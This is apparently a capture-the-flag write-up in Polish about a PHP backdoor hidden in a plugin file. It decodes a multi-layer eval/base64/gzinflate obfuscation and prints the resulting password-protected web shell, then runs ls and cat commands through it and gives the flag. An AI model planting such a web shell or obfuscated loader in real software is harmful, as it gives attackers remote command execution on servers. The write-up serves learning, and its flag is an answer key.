# backdoor
![](4b1c5b392d2630c66e7cbc7e694cd8fa)

Wspomniany w opisie backdoor znajduje się w "/plugins/toast/exploit.php". Napisałem kod odwzorujący działanie `eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))))`.

Po odszyfrowaniu Cyto uzyskałem:
```
eval(&quot;?&gt;&quot;.str_rot13(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(base64_decode(strrev($Lix))))))))))));
```

Po napisaniu kodu odwzorujący działanie powyższego kodu uzyskałem:
```
<?php\e\aif ($_SERVER["REQUEST_METHOD"] === "POST") {\e\a    $command = $_POST["command"];\e\a    $password = $_POST["password"];\e\a\e\a    if ($password == "S3cr3tP4ssw0rd") {\e\a        $output = shell_exec($command);\e\a        echo "<pre>$output</pre>";\e\a    } else {\e\a        echo "Wrong password!";\e\a    }\e\a}\e\a?>\e\a\e\a<form method="post">\e\a    <input type="text" name="command" placeholder="command" required>\e\a    <input type="password" name="password" placeholder="password" required>\e\a    <button type="submit">>>></button>\e\a</form>
```

Znając hasło można wykonać dowolną komendę. Wprowadzając `cd ../..;ls` wyświetla się:
```
Dockerfile
c85ebe2c-213c-4593-b6e7-f908440ee066.txt
img
index.php
plugins
```

Wygląda na to, że flaga jest w `c85ebe2c-213c-4593-b6e7-f908440ee066.txt`
Wprowadzając `cat ../../c85ebe2c-213c-4593-b6e7-f908440ee066.txt` wyświetla się flaga.

Ostateczny kod: `backdoor.py`

Flaga: `WSIZ{M45ter_0f_PHP_Obfu5c4t!on}`